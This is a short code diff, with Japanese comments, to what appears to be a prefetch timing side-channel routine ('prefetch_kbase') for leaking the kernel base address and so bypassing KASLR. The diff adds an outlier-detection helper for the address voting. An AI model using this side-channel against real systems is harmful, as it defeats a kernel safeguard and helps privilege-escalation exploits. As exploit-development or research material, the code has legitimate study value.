@@ -27,6 +27,30 @@ static uint64_t measure_prefetch_time(const uint64_t addr) {
     return ret;
 }
 
+// 統計的に最も平均から離れているインデックスを探すヘルパー関数
+static uint64_t find_outlier_index(const uint64_t *times, uint64_t count) {
+    if (count == 0) {
+        return 0;
+    }
+
+    double mean = 0.0;
+    for (uint64_t i = 0; i < count; i++) {
+        mean += (double)times[i];
+    }
+    mean /= count;
+
+    double max_diff = -1.0;
+    uint64_t outlier_idx = 0;
+    for (uint64_t i = 0; i < count; i++) {
+        const double diff = FABS((double)times[i] - mean);
+        if (diff > max_diff) {
+            max_diff = diff;
+            outlier_idx = i;
+        }
+    }
+    return outlier_idx;
+}
+
 uint64_t prefetch_kbase() {
     uint64_t num_trials = 10;
     const uint64_t num_vote = 10;
@@ -55,8 +79,8 @@ uint64_t prefetch_kbase() {
             }
             // 最も実行時間が短かったアドレスに投票
             // 汎用的には、一番離れているアドレスに投票するべき
-            const uint64_t min_index = argmax_u64(min_time, num_steps);
-            cand_addr[vote] = (start + step * min_index) & ~0xfffff;
+            const uint64_t outlier_index = find_outlier_index(min_time, num_steps);
+            cand_addr[vote] = (start + step * outlier_index) & ~0xfffff;
         }
         // 集めた候補に対して、過半数の投票があったかを確認する
         for (uint64_t i = 0; i < num_vote; i++) {
@@ -72,6 +96,6 @@ uint64_t prefetch_kbase() {
             }
         }
     }
-    puts("[-] unable to detect kbase\n");
+    puts("[-] unable to detect kbase");
     return 0;
 }
